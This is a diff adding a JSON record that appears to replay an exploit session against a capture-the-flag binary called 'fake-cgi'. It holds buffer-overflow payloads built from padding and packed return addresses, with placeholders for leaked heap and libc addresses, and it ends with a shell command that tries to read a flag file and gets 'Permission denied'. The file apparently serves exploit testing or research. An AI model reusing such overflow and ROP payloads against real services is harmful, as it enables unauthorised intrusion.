@@ -1,0 +1,13 @@
+[
+    "1Who r u?\\n", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd\\n", 
+    "1wel{{{HEAP_BASE:12131:3:ORI:3:0x6d6f63}}}e!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\\xa3\\t@\\x00\\x00\\x00\\x00\\x00\\x18\\x10`\\x00\\x00\\x00\\x00\\x00 \\x06@\\x00\\x00\\x00\\x00\\x00\\xb6\\x07@\\x00\\x00\\x00\\x00\\x00\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\\xa3\\t@HTTP/1.1 404{{{HEAP_BASE:134688:3:ORI:197:0x6f4e20}}}t{{{HEAP_BASE:132640:3:ORI:201:0x6f4620}}}und\\r{{{HEAP_BASE:131850:3:ORI:138:0x6f430a}}}n{{{HEAP_BASE:75124:3:ORI:142:0x6e6574}}}t-Type: text/{{{HEAP_BASE:13416:3:ORI:118:0x6d7468}}}l; charset=UTF-8\\r{{{HEAP_BASE:131850:3:ORI:138:0x6f430a}}}n{{{HEAP_BASE:75124:3:ORI:142:0x6e6574}}}t-{{{HEAP_BASE:75084:3:ORI:147:0x6e654c}}}gth: 23\\r\\nServer: EasyServer ({{{HEAP_BASE:76108:3:ORI:179:0x6e694c}}}ux)\\r\\n\\r\\n<h3>Page{{{HEAP_BASE:134688:3:ORI:197:0x6f4e20}}}t{{{HEAP_BASE:132640:3:ORI:201:0x6f4620}}}und</h3>{{{LIBC_BASE:456336:6:ORI:212:0x7f5917135690}}}\\nWho r u?\\n", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd\\n", 
+    "1wel{{{HEAP_BASE:12131:3:ORI:3:0x6d6f63}}}e!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb{{{LIBC_BASE:283158:8:ORI:72:0x7f591710b216}}}\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb{{{LIBC_BASE:283158:6:ORI:72:0x7f591710b216}}}HTTP/1.1 404{{{HEAP_BASE:134688:3:ORI:200:0x6f4e20}}}t{{{HEAP_BASE:132640:3:ORI:204:0x6f4620}}}und\\r{{{HEAP_BASE:131850:3:ORI:141:0x6f430a}}}n{{{HEAP_BASE:75124:3:ORI:145:0x6e6574}}}t-Type: text/{{{HEAP_BASE:13416:3:ORI:121:0x6d7468}}}l; charset=UTF-8\\r{{{HEAP_BASE:131850:3:ORI:141:0x6f430a}}}n{{{HEAP_BASE:75124:3:ORI:145:0x6e6574}}}t-{{{HEAP_BASE:75084:3:ORI:150:0x6e654c}}}gth: 23\\r\\nServer: EasyServer ({{{HEAP_BASE:76108:3:ORI:182:0x6e694c}}}ux)\\r\\n\\r\\n<h3>Page{{{HEAP_BASE:134688:3:ORI:200:0x6f4e20}}}t{{{HEAP_BASE:132640:3:ORI:204:0x6f4620}}}und</h3>", 
+    "0/{{{HEAP_BASE:76130:3:ORI:1:0x6e6962}}}/cat /flags/fake-cgi/flag\\n", 
+    "2sh: 1: /{{{HEAP_BASE:76130:3:ORI:8:0x6e6962}}}/cat: P{{{HEAP_BASE:12901:3:ORI:18:0x6d7265}}}iss{{{HEAP_BASE:77673:3:ORI:24:0x6e6f69}}} {{{HEAP_BASE:75108:3:ORI:28:0x6e6564}}}ied\\n"
+]
